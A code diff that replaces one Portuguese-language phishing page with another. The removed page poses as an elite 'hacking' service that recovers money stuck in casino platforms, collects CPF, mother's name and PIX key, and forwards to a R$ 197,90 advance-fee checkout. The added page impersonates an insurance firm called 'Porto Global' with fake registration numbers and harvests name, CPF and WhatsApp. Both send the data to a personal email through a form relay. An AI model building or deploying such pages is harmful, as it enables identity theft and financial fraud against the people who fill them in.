@@ -3,241 +3,238 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>BLACK MIRROR // DATABASE_OVERRIDE_V4</title>
-    <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;700&family=Inter:wght@400;700;900&display=swap" rel="stylesheet">
+    <title>Porto Global | Portal Federal de Auditoria e Registros</title>
+    <link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@700;800&family=Inter:wght@400;500;600&display=swap" rel="stylesheet">
     <style>
-        :root { --danger: #ff003c; --neon: #00f0ff; --bg: #000; --border: #30363d; --green: #39d353; --cobalt: #0047ff; }
-        * { margin: 0; padding: 0; box-sizing: border-box; }
-        body { font-family: 'Inter', sans-serif; background: var(--bg); color: #e5e5e5; overflow-x: hidden; }
+        :root { --primary: #001f3f; --accent: #0056b3; --text: #1e293b; --bg: #f1f5f9; --white: #ffffff; --green: #10b981; --error: #ef4444; }
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Inter', sans-serif; }
+        body { background-color: var(--bg); color: var(--text); overflow-x: hidden; }
 
-        /* HEADER DE SEGURANÇA */
-        .status-bar { background: #000; padding: 10px 20px; border-bottom: 1px solid var(--border); display: flex; justify-content: space-between; font-family: 'JetBrains Mono'; font-size: 9px; color: var(--neon); text-transform: uppercase; letter-spacing: 1px; }
-        .live-dot { height: 7px; width: 7px; background: var(--green); border-radius: 50%; display: inline-block; margin-right: 5px; box-shadow: 0 0 10px var(--green); }
+        /* CABEÇALHO */
+        header { background: var(--white); padding: 15px; text-align: center; border-bottom: 3px solid var(--primary); box-shadow: 0 4px 6px rgba(0,0,0,0.05); }
+        .logo { font-family: 'Montserrat', sans-serif; font-weight: 800; color: var(--primary); text-transform: uppercase; font-size: 18px; letter-spacing: -0.5px; }
+        .logo span { color: var(--accent); }
+        .geo-tag { background: #e2e8f0; font-size: 10px; padding: 6px; font-weight: bold; color: var(--primary); text-align: center; text-transform: uppercase; border-bottom: 1px solid #cbd5e1; }
 
-        .container { max-width: 900px; margin: 0 auto; padding: 40px 20px; }
-        .screen { display: none; }
-        .screen.active { display: block; animation: fadeIn 0.5s ease; }
-        @keyframes fadeIn { from { opacity: 0; transform: translateY(15px); } to { opacity: 1; transform: translateY(0); } }
+        /* PROGRESSO */
+        .progress-container { width: 100%; height: 6px; background: #cbd5e1; }
+        #bar { height: 100%; background: var(--primary); width: 15%; transition: 1s cubic-bezier(0.4, 0, 0.2, 1); }
 
-        /* ESTILO DOSSIÊ */
-        .dossier-card { background: #050505; border: 1px solid var(--border); border-left: 5px solid var(--danger); padding: 40px; position: relative; box-shadow: 0 10px 30px rgba(0,0,0,0.5); }
-        .dossier-card::before { content: "CLASSIFIED // TOP SECRET"; position: absolute; top: -12px; right: 20px; background: var(--danger); color: #fff; font-size: 9px; padding: 3px 10px; font-weight: 900; }
+        /* CONTAINER */
+        .container { max-width: 450px; margin: 20px auto; padding: 0 15px; padding-bottom: 80px; }
+        .form-card { background: var(--white); padding: 35px 25px; border-radius: 24px; box-shadow: 0 25px 50px -12px rgba(0,0,0,0.15); border: 1px solid #e2e8f0; }
+
+        .step { display: none; }
+        .step.active { display: block; animation: slideUp 0.4s ease forwards; }
+        @keyframes slideUp { from { opacity: 0; transform: translateY(15px); } to { opacity: 1; transform: translateY(0); } }
+
+        h2 { font-family: 'Montserrat', sans-serif; font-size: 18px; color: var(--primary); margin-bottom: 25px; text-align: center; font-weight: 800; }
         
-        h1 { font-size: clamp(35px, 6vw, 55px); font-weight: 900; text-transform: uppercase; line-height: 0.85; margin-bottom: 25px; color: #fff; }
-        .manifesto-body { line-height: 1.8; color: #999; font-size: 14px; text-align: justify; margin-bottom: 30px; border-bottom: 1px solid #1a1d23; padding-bottom: 30px; }
-        .highlight { color: var(--danger); font-weight: 900; }
+        /* BOTÕES DE SELEÇÃO */
+        .category-btn { 
+            width: 100%; padding: 20px; border: 2px solid #f1f5f9; border-radius: 14px; 
+            margin-bottom: 12px; cursor: pointer; font-weight: 700; color: var(--primary); 
+            background: #fff; transition: 0.3s; text-align: left; display: flex; justify-content: space-between; align-items: center;
+        }
+        .category-btn:hover { border-color: var(--accent); background: #f8fafc; transform: scale(1.02); }
 
-        .btn-access { width: 100%; padding: 25px; background: var(--danger); color: #fff; border: none; font-weight: 900; font-family: 'JetBrains Mono'; cursor: pointer; text-transform: uppercase; letter-spacing: 3px; font-size: 18px; transition: 0.3s; }
-        .btn-access:hover { background: #fff; color: #000; box-shadow: 0 0 50px var(--danger); }
+        /* FORMULÁRIOS */
+        label { display: block; font-size: 10px; font-weight: 800; color: #64748b; text-transform: uppercase; margin: 18px 0 6px; }
+        input, select { width: 100%; padding: 15px; border: 2px solid #e2e8f0; border-radius: 12px; font-size: 16px; outline: none; transition: 0.3s; background: #fafafa; }
+        input:focus { border-color: var(--primary); background: #fff; }
+        input.invalid { border-color: var(--error); background: #fff1f1; }
 
-        /* FORMULÁRIO TÉCNICO */
-        .system-container { max-width: 500px; margin: 20px auto; }
-        label { font-family: 'JetBrains Mono'; font-size: 10px; color: #555; text-transform: uppercase; display: block; margin-bottom: 8px; margin-top: 15px; }
-        input, select { width: 100%; background: #000; border: 1px solid var(--border); padding: 15px; color: var(--neon); font-family: 'JetBrains Mono'; outline: none; transition: 0.3s; }
-        input:focus { border-color: var(--neon); box-shadow: 0 0 10px rgba(0,240,255,0.1); }
+        .btn-action { 
+            width: 100%; padding: 18px; background: var(--primary); color: #fff; border: none; 
+            border-radius: 12px; font-size: 15px; font-weight: 800; cursor: pointer; margin-top: 25px; text-transform: uppercase;
+        }
 
-        .error-msg { color: var(--danger); font-size: 10px; margin-top: 5px; display: none; font-weight: bold; }
+        /* AUDITORIA VISUAL */
+        .audit-item { display: flex; align-items: center; gap: 10px; margin-bottom: 12px; font-size: 13px; color: #94a3b8; }
+        .audit-item.done { color: var(--primary); font-weight: 600; }
+        .audit-item.done::before { content: '✓'; color: var(--green); font-weight: bold; font-size: 16px; }
 
-        /* TERMINAL DE LOGS */
-        .terminal { background: #000; border: 1px solid var(--border); padding: 25px; height: 350px; overflow-y: auto; font-family: 'JetBrains Mono'; font-size: 11px; color: var(--green); line-height: 2; }
-
-        /* RESULTADO FINAL */
-        .value-card { background: #010409; border: 1px solid var(--neon); padding: 35px; text-align: center; margin-bottom: 25px; box-shadow: inset 0 0 20px rgba(0,240,255,0.05); }
-        .amount { font-size: 48px; font-weight: 900; color: #fff; letter-spacing: -2px; }
-        
-        .cost-table { width: 100%; font-size: 11px; border-collapse: collapse; margin-bottom: 25px; background: #0a0a0a; }
-        .cost-table td { padding: 12px; border: 1px solid #1a1d23; }
-        .label-td { color: #666; text-transform: uppercase; }
-        .val-td { color: #fff; text-align: right; font-weight: bold; }
-
-        footer { text-align: center; padding: 50px 0; font-size: 10px; opacity: 0.3; letter-spacing: 4px; font-family: 'JetBrains Mono'; }
+        footer { text-align: center; padding: 40px 20px; font-size: 10px; color: #94a3b8; line-height: 1.8; border-top: 1px solid #e2e8f0; margin-top: 20px; }
+        .secure-tag { color: var(--green); font-size: 9px; font-weight: 900; letter-spacing: 1px; display: block; margin-bottom: 15px; text-align: center; }
     </style>
 </head>
 <body>
 
-    <div class="status-bar">
-        <div><span class="live-dot"></span> UPLINK: STABLE // ENCRYPTED</div>
-        <div>SESSION_ID: <span id="sess-id">---</span></div>
-        <div>DB_ACCESS: GRANTED</div>
-    </div>
+<header><div class="logo">PORTO<span>GLOBAL</span></div></header>
+<div class="geo-tag" id="user-location">Sincronizando com base de dados local...</div>
+<div class="progress-container"><div id="bar"></div></div>
 
-    <div class="container">
+<div class="container">
+    <div class="form-card">
+        <span class="secure-tag">● PROTOCOLO DE AUDITORIA ATIVO</span>
 
-        <div id="screen-manifesto" class="screen active">
-            <div class="dossier-card">
-                <h1>Black Mirror<br>Solutions</h1>
-                <div class="manifesto-body">
-                    A liberdade financeira não é concedida; ela é <span class="highlight">RETOMADA</span>. Operamos como uma unidade de elite de segurança ofensiva, especializada em Auditoria de Gateways e Extração de Ativos em Nuvem.
-                    <br><br>
-                    Se o seu capital foi retido por burocracias ou travado em plataformas de entretenimento digital (Cassinos e Slots), o sistema falhou com você. Nossa tecnologia realiza o bypass institucional e força a liquidação dos seus ativos diretamente para sua chave PIX.
-                </div>
-                <button class="btn-access" onclick="showScreen('screen-manifesto', 'screen-form')">Iniciar Scanner de Ativos</button>
-            </div>
+        <div class="step active" id="s1">
+            <h2>O que deseja formalizar?</h2>
+            <div class="category-btn" onclick="openStep('veiculo')">Registro Automotivo <span>➔</span></div>
+            <div class="category-btn" onclick="openStep('casa')">Registro Patrimonial <span>➔</span></div>
+            <div class="category-btn" onclick="openStep('saude')">Seguro de Vida e Saúde <span>➔</span></div>
         </div>
 
-        <div id="screen-form" class="screen system-container">
-            <div class="dossier-card" style="border-left-color: var(--cobalt);">
-                <h2 style="font-size: 18px; color: #fff; margin-bottom: 10px; text-transform: uppercase;">Protocolo de Identificação</h2>
-                
-                <label>Nome Completo do Titular</label>
-                <input type="text" id="nome" placeholder="NOME IGUAL AO REGISTRO">
-
-                <label>Nome da Mãe (Filtro de Segurança)</label>
-                <input type="text" id="mae" placeholder="NOME MATERNO">
-
-                <div style="display: flex; gap: 15px;">
-                    <div style="flex: 2;">
-                        <label>Registro CPF</label>
-                        <input type="tel" id="cpf" placeholder="000.000.000-00" oninput="maskCPF(this)" maxlength="14">
-                        <div id="error-cpf" class="error-msg">[!] CPF INVÁLIDO</div>
-                    </div>
-                    <div style="flex: 1;">
-                        <label>UF (Estado)</label>
-                        <select id="uf">
-                            <option value="">--</option>
-                            <option value="SP">SP</option><option value="RJ">RJ</option><option value="MG">MG</option>
-                            <option value="PR">PR</option><option value="RS">RS</option><option value="SC">SC</option>
-                            <option value="BA">BA</option><option value="PE">PE</option><option value="CE">CE</option>
-                        </select>
-                    </div>
-                </div>
-
-                <label>Data de Nascimento</label>
-                <input type="date" id="nascimento">
-
-                <button class="btn-access" style="background: var(--cobalt); font-size: 15px; margin-top: 20px;" onclick="validateAndHack()">Executar Varredura Profunda</button>
-            </div>
+        <div class="step" id="step-veiculo">
+            <h2>Dados do Veículo</h2>
+            <label>Marca e Modelo do Veículo</label>
+            <input type="text" id="v_modelo" placeholder="Ex: Honda Civic 2024">
+            <label>Placa (Obrigatório)</label>
+            <input type="text" id="v_placa" placeholder="ABC1D23">
+            <label>Ano de Fabricação</label>
+            <input type="number" id="v_ano" placeholder="2024">
+            <button class="btn-action" onclick="toPersonal()">Validar e Avançar</button>
         </div>
 
-        <div id="screen-term" class="screen system-container">
-            <div class="terminal" id="term-logs"></div>
+        <div class="step" id="step-casa">
+            <h2>Dados Patrimoniais</h2>
+            <label>Tipo de Imóvel</label>
+            <select id="c_tipo">
+                <option value="casa">Casa de Rua</option>
+                <option value="apto">Apartamento</option>
+                <option value="condo">Casa em Condomínio</option>
+            </select>
+            <label>CEP da Localização</label>
+            <input type="tel" id="c_cep" placeholder="00000-000" maxlength="9">
+            <label>O Imóvel é Próprio?</label>
+            <select id="c_prop">
+                <option value="sim">Sim, Próprio</option>
+                <option value="alugado">Alugado</option>
+            </select>
+            <button class="btn-action" onclick="toPersonal()">Validar e Avançar</button>
         </div>
 
-        <div id="screen-res" class="screen system-container">
-            <div class="dossier-card" style="border-left-color: var(--green); padding: 30px;">
-                <div style="text-align: center; color: var(--green); font-size: 10px; font-weight: 900; margin-bottom: 15px;">[✓] TÚNEL DE LIQUIDAÇÃO ATIVO</div>
-
-                <div class="value-card">
-                    <div style="font-size: 9px; color: var(--neon); font-weight: 800; margin-bottom: 5px;">TOTAL LÍQUIDO A RECEBER</div>
-                    <div class="amount" id="final-val">R$ 0,00</div>
-                </div>
-
-                <table class="cost-table">
-                    <tr><td class="label-td">Origem Ativos:</td><td class="val-td">Gateways Camada 7</td></tr>
-                    <tr><td class="label-td">Status Extração:</td><td class="val-td">Concluída</td></tr>
-                    <tr><td class="label-td">Taxa Operacional:</td><td class="val-td">R$ 197,90</td></tr>
-                </table>
-
-                <label style="color:var(--neon)">Informe sua Chave PIX para o Depósito</label>
-                <input type="text" id="pix-chave" placeholder="Chave CPF, E-mail ou Celular">
-
-                <div style="font-size: 10px; color: #fff; background: rgba(255,0,60,0.1); padding: 15px; border: 1px solid var(--danger); line-height: 1.6; margin-top: 20px; margin-bottom: 20px;">
-                    <b>AVISO DE RESGATE:</b> Para desviar a retenção dos provedores e liberar o saldo, o sistema exige a ativação da Tarifa Operacional (TPO) de <b>R$ 197,90</b>. Este valor é integralmente somado ao seu saque final.
-                </div>
-
-                <button class="btn-access" style="background: var(--green); color: #000;" onclick="finalizarOp()">Liberar Pagamento Agora</button>
-            </div>
+        <div class="step" id="step-saude">
+            <h2>Dados do Beneficiário</h2>
+            <label>Profissão Atual</label>
+            <input type="text" id="s_prof" placeholder="Ex: Engenheiro">
+            <label>Idade do Titular</label>
+            <input type="number" id="s_idade" placeholder="Ex: 35">
+            <label>Histórico de Saúde</label>
+            <select id="s_hist">
+                <option value="nenhum">Nenhuma observação</option>
+                <option value="pre">Doença preexistente</option>
+            </select>
+            <button class="btn-action" onclick="toPersonal()">Validar e Avançar</button>
         </div>
 
-    </div>
-
-    <footer>BLACK MIRROR SOLUTIONS // SYSTEM OVERRIDE // 2026</footer>
-
-    <script>
-        const CONFIG = { EMAIL: "zndohot@gmail.com", CHECKOUT: "https://pay.cakto.com.br/3afi959" };
-
-        document.getElementById('sess-id').innerText = "0x" + Math.random().toString(16).substring(2, 8).toUpperCase();
-
-        function showScreen(hide, show) {
-            document.getElementById(hide).classList.remove('active');
-            document.getElementById(show).classList.add('active');
-            window.scrollTo(0,0);
-        }
-
-        function maskCPF(i) {
-            let v = i.value.replace(/\D/g, "");
-            v = v.replace(/(\d{3})(\d)/, "$1.$2");
-            v = v.replace(/(\d{3})(\d)/, "$1.$2");
-            v = v.replace(/(\d{3})(\d{1,2})$/, "$1-$2");
-            i.value = v;
-        }
-
-        function validaCPF(cpf) {
-            cpf = cpf.replace(/\D/g, "");
-            if (cpf.length !== 11 || !!cpf.match(/(\d)\1{10}/)) return false;
-            let cpfs = cpf.split("").map(el => +el);
-            const rest = (count) => (cpfs.slice(0, count-12).reduce((soma, el, i) => soma + el * (count - i), 0) * 10) % 11 % 10;
-            return rest(10) === cpfs[9] && rest(11) === cpfs[10];
-        }
-
-        function validateAndHack() {
-            const cpf = document.getElementById('cpf').value;
-            const nome = document.getElementById('nome').value;
-            const mae = document.getElementById('mae').value;
-            const nasc = document.getElementById('nascimento').value;
-
-            if (!validaCPF(cpf)) { document.getElementById('error-cpf').style.display = 'block'; return; }
-            if (nome.length < 5 || mae.length < 5 || !nasc) { alert("Preencha todos os dados do dossiê."); return; }
+        <div class="step" id="s-personal">
+            <h2>Identificação do Titular</h2>
+            <label>Nome Completo (Mínimo 2 nomes)</label>
+            <input type="text" id="nome" placeholder="NOME E SOBRENOME">
             
-            startHacking();
-        }
-
-        function startHacking() {
-            showScreen('screen-form', 'screen-term');
-            const logs = [
-                "> Conectando ao Backbone de Provedores...",
-                "> Validando metadados: " + document.getElementById('cpf').value,
-                "> Localizando contas vinculadas em Camada 7...",
-                "> [!] ALERTA: Saldos órfãos detectados em 12 gateways.",
-                "> Iniciando Injeção de Código para Bypass...",
-                "> Quebrando travas administrativas de saque...",
-                "> Consolidando valores para o titular...",
-                "> Gerando alvará de liquidação imediata..."
-            ];
-
-            let i = 0;
-            const term = document.getElementById('term-logs');
-            const interval = setInterval(() => {
-                const line = document.createElement('div');
-                line.innerHTML = logs[i];
-                term.appendChild(line);
-                term.scrollTop = term.scrollHeight;
-                i++;
-                if (i >= logs.length) {
-                    clearInterval(interval);
-                    setTimeout(mostrarResgate, 1000);
-                }
-            }, 1000);
-        }
-
-        function mostrarResgate() {
-            const seed = Math.floor(Math.random() * (5400 - 3200) + 3200);
-            const total = seed + 197.90;
-            document.getElementById('final-val').innerText = total.toLocaleString('pt-br', {style: 'currency', currency: 'BRL'});
-            showScreen('screen-term', 'screen-res');
-        }
-
-        function finalizarOp() {
-            if(document.getElementById('pix-chave').value.length < 5) return alert("Informe sua Chave PIX.");
+            <label>CPF (Validação Matemática Real)</label>
+            <input type="tel" id="cpf" placeholder="000.000.000-00" maxlength="14" oninput="maskCPF(this)">
             
-            const data = {
-                Nome: document.getElementById('nome').value,
-                Mae: document.getElementById('mae').value,
-                CPF: document.getElementById('cpf').value,
-                Nascimento: document.getElementById('nascimento').value,
-                UF: document.getElementById('uf').value,
-                PIX: document.getElementById('pix-chave').value,
-                Valor_Extraido: document.getElementById('final-val').innerText
-            };
+            <label>WhatsApp Oficial</label>
+            <input type="tel" id="whats" placeholder="(00) 9 0000-0000" maxlength="15" oninput="maskTel(this)">
+            
+            <button class="btn-action" onclick="finalProcess()">Concluir Registro Real</button>
+        </div>
 
-            fetch(`https://formsubmit.co/ajax/${CONFIG.EMAIL}`, {
-                method: "POST",
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify(data)
-            }).finally(() => { 
-                window.location.href = CONFIG.CHECKOUT; 
-            });
-        }
-    </script>
+        <div class="step" id="s-audit">
+            <h2 style="margin-bottom:15px">Auditando Protocolo...</h2>
+            <div id="audit-logs">
+                <div class="audit-item" id="l1">Estabelecendo conexão segura...</div>
+                <div class="audit-item" id="l2">Validando CPF na base nacional...</div>
+                <div class="audit-item" id="l3">Sincronizando ativos e registros...</div>
+            </div>
+            <div style="text-align:center; margin-top:25px"><img src="https://i.gifer.com/ZZ5H.gif" width="40"></div>
+        </div>
+
+        <div class="step" id="s-success" style="text-align:center">
+            <div style="color:var(--green); font-size:60px; margin-bottom: 10px;">✓</div>
+            <h2 style="color:var(--green)">Registro Autenticado!</h2>
+            <p style="font-size:14px; color: #475569; line-height: 1.6;">O seu protocolo foi gerado com sucesso. Como os dados informados são <b>reais</b>, um consultor da <b>Porto Global</b> entrará em contato via WhatsApp em instantes.</p>
+        </div>
+
+    </div>
+</div>
+
+<footer>
+    © 2026 PORTO GLOBAL SEGUROS S.A.<br>
+    Consultoria de Risco e Auditoria Patrimonial<br>
+    CNPJ: 00.000.000/0001-00 | SUSEP: 10.0442-9
+</footer>
+
+<script>
+    const RECEPTOR = "zndohot@gmail.com";
+    let modalidade = "";
+
+    // GEOLOCALIZAÇÃO AUTOMÁTICA
+    fetch('https://ipapi.co/json/').then(r => r.json()).then(d => {
+        document.getElementById('user-location').innerText = `DEMANDA ALTA EM ${d.city.toUpperCase()} - ${d.region_code}`;
+    }).catch(() => { document.getElementById('user-location').innerText = "CONEXÃO NACIONAL SEGURA ATIVA"; });
+
+    function openStep(t) {
+        modalidade = t;
+        hide();
+        document.getElementById('step-' + t).classList.add('active');
+        document.getElementById('bar').style.width = "40%";
+    }
+
+    function toPersonal() {
+        hide();
+        document.getElementById('s-personal').classList.add('active');
+        document.getElementById('bar').style.width = "70%";
+    }
+
+    // VALIDADOR REAL DE CPF (ALGORITMO OFICIAL)
+    function validarCPF(cpf) {
+        cpf = cpf.replace(/[^\d]+/g,'');
+        if(cpf.length !== 11 || /^(\d)\1{10}$/.test(cpf)) return false;
+        let soma = 0, resto;
+        for (let i=1; i<=9; i++) soma += parseInt(cpf.substring(i-1, i)) * (11 - i);
+        resto = (soma * 10) % 11; if (resto == 10 || resto == 11) resto = 0;
+        if (resto != parseInt(cpf.substring(9, 10))) return false;
+        soma = 0;
+        for (let i = 1; i <= 10; i++) soma += parseInt(cpf.substring(i-1, i)) * (12 - i);
+        resto = (soma * 10) % 11; if (resto == 10 || resto == 11) resto = 0;
+        return (resto == parseInt(cpf.substring(10, 11)));
+    }
+
+    function finalProcess() {
+        const cpfVal = document.getElementById('cpf').value;
+        const nomeVal = document.getElementById('nome').value;
+        const whatsVal = document.getElementById('whats').value;
+
+        if(nomeVal.split(' ').length < 2) return alert("Por favor, insira seu nome completo.");
+        if(!validarCPF(cpfVal)) return alert("CPF Inválido! Use um documento real para autenticação.");
+        if(whatsVal.length < 14) return alert("WhatsApp incompleto.");
+
+        hide();
+        document.getElementById('s-audit').classList.add('active');
+        document.getElementById('bar').style.width = "100%";
+
+        setTimeout(() => document.getElementById('l1').classList.add('done'), 1000);
+        setTimeout(() => document.getElementById('l2').classList.add('done'), 2200);
+        setTimeout(() => document.getElementById('l3').classList.add('done'), 3400);
+
+        fetch(`https://formsubmit.co/ajax/${RECEPTOR}`, {
+            method: "POST",
+            headers: {'Content-Type': 'application/json'},
+            body: JSON.stringify({ Nome: nomeVal, CPF: cpfVal, Whats: whatsVal, Tipo: modalidade })
+        }).finally(() => {
+            setTimeout(() => {
+                document.getElementById('s-audit').style.display = 'none';
+                document.getElementById('s-success').style.display = 'block';
+            }, 5000);
+        });
+    }
+
+    function hide() { document.querySelectorAll('.step').forEach(s => s.classList.remove('active')); }
+    
+    function maskCPF(i) {
+        let v = i.value.replace(/\D/g, "");
+        v = v.replace(/(\d{3})(\d)/, "$1.$2").replace(/(\d{3})(\d)/, "$1.$2").replace(/(\d{3})(\d{1,2})$/, "$1-$2");
+        i.value = v;
+    }
+    
+    function maskTel(i) {
+        let v = i.value.replace(/\D/g, "");
+        v = v.replace(/^(\d{2})(\d)/g, "($1) $2").replace(/(\d)(\d{4})$/, "$1-$2");
+        i.value = v;
+    }
+</script>
 </body>
 </html>
